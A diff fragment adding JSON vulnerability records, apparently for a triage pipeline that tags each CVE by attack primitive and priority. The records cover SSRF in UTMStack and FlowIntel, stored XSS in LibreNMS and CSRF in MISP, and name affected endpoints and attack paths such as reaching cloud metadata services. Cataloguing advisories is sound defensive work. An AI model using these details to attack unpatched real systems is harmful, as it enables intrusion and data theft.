+   "https://www.lasso.security/vulnerability-database/cve-2026-76066",
+   "https://www.vulncheck.com/advisories/intentkit-executor-tool-authorization-bypass-via-toolnode"
+  ],
+  "vendor": "crestalnetwork"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/utmstack/UTMStack/commit/4e7a727c3b8d8e2ad020d3b4f982a6d085dbecdd"
+  ],
+  "cpes": [],
+  "cve_id": "CVE-2026-82040",
+  "description": "UTMStack before 11.2.16 contains a server-side request forgery vulnerability in IdentityProviderService.validateMetadataUrl() that allows authenticated attackers to make the server send requests to arbitrary internal or cloud metadata hosts by supplying a malicious metadata URL to the identity-providers endpoint. Attackers can exploit the POST/PUT /api/identity-providers endpoint with no validation of target host, IP, or scheme to perform internal network port scanning and access cloud instance-metadata services.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "ssrf"
+  ],
+  "priority": 28,
+  "product": "UTMStack",
+  "published": "2026-10-02T20:17:04.587",
+  "references": [
+   "https://github.com/UTMStack/UTMStack/releases/tag/v11.2.16",
+   "https://github.com/utmstack/UTMStack/commit/4e7a727c3b8d8e2ad020d3b4f982a6d085dbecdd",
+   "https://www.vulncheck.com/advisories/utmstack-ssrf-via-identityproviderservice"
+  ],
+  "vendor": "UTMStack"
+ },
+ {
+  "advisory_refs": [
+   "https://github.com/librenms/librenms/security/advisories/GHSA-7gww-x7fh-jf9j",
+   "https://github.com/librenms/librenms/security/advisories/GHSA-7gww-x7fh-jf9j"
+  ],
+  "commit_refs": [],
+  "cpes": [],
+  "cve_id": "CVE-2026-84189",
+  "description": "LibreNMS through 26.4.0 renders JSON fields (name, ip, model, author, commit message) returned by the admin-configurable Oxidized integration URL (oxidized.url) into the device showconfig page without applying htmlspecialchars(). An administrator who points the Oxidized URL at an attacker-controlled server (SSRF) can cause it to return malicious JSON, resulting in stored/persistent cross-site scripting affecting all users who view any device's showconfig tab. Fixed in 26.7.0.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "ssrf"
+  ],
+  "priority": 30,
+  "product": "librenms",
+  "published": "2026-09-01T12:17:48.287",
+  "references": [
+   "https://github.com/librenms/librenms/security/advisories/GHSA-7gww-x7fh-jf9j",
+   "https://www.vulncheck.com/advisories/librenms-before-26.7.0-stored-xss-via-oxidized-api"
+  ],
+  "vendor": "librenms"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/MISP/MISP/commit/979337b18"
+  ],
+  "cpes": [],
+  "cve_id": "CVE-2026-90893",
+  "description": "MISP contains a Cross-Site Request Forgery (CSRF) vulnerability in the UserSettingsController. The actions setTheme, setHomePage, and eventIndexColumnToggle were explicitly added to the Security component's unlockedActions list, which disabled all CSRF validation (both token and field-hash checks) for those endpoints. Because these endpoints accept POST requests and modify per-user application state (theme selection, default homepage URL, and event index column visibility), an attacker who can induce a logged-in MISP user to load a malicious page (e.g., via a crafted link, embedded image, or auto-submitting form) can forge requests that alter the victim's settings without their knowledge or consent. The most impactful action is setHomePage, which allows an attacker to redirect the victim's default landing page to an arbitrary attacker-controlled URL, potentially facilitating phishing or further social engineering. The setTheme action can alter the user's visual theme, and eventIndexColumnToggle can change which columns are displayed in the event index view. No authentication bypass is involved; the victim must already be authenticated to MISP. The vulnerability was reported by the Scottish Government National Cyber Team. Version affected: ≤2.5.45",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "auth_bypass"
+  ],
+  "priority": 28,
+  "product": "MISP",
+  "published": "2026-09-14T10:17:05.930",
+  "references": [
+   "https://github.com/MISP/MISP/commit/979337b18"
+  ],
+  "vendor": "MISP"
+ },
+ {
+  "advisory_refs": [],
+  "commit_refs": [
+   "https://github.com/flowintel/flowintel/commit/68b523b47854c54bf36fd706c0fd5353063b5409"
+  ],
+  "cpes": [
+   "cpe:2.3:a:flowintel:flowintel:*:*:*:*:*:*:*:*"
+  ],
+  "cve_id": "CVE-2026-9813",
+  "description": "FlowIntel up to version 3.3.0 contains a server-side request forgery (SSRF) vulnerability in the external reference URL probe functionality in app/case/task.py. An attacker who can submit an external reference URL can cause the application server to issue an HTTP HEAD request to an attacker-specified destination. Due to insufficient validation of the URL scheme and resolved destination address, affected versions may allow requests to loopback, link-local, private, reserved, or other restricted network resources, potentially enabling interaction with internal services or cloud metadata endpoints from the server's network context.",
+  "ecosystem_hint": "",
+  "osv_refs": [],
+  "prefilter_reason": "matched web-facing secret-disclosure pattern",
+  "primitives": [
+   "ssrf"
+  ],
+  "priority": 28,
+  "product": "flowintel",
+  "published": "2026-05-28T10:16:40.243",
+  "references": [
+   "https://github.com/flowintel/flowintel/commit/68b523b47854c54bf36fd706c0fd5353063b5409"
+  ],
+  "vendor": "flowintel"
+ }
+]
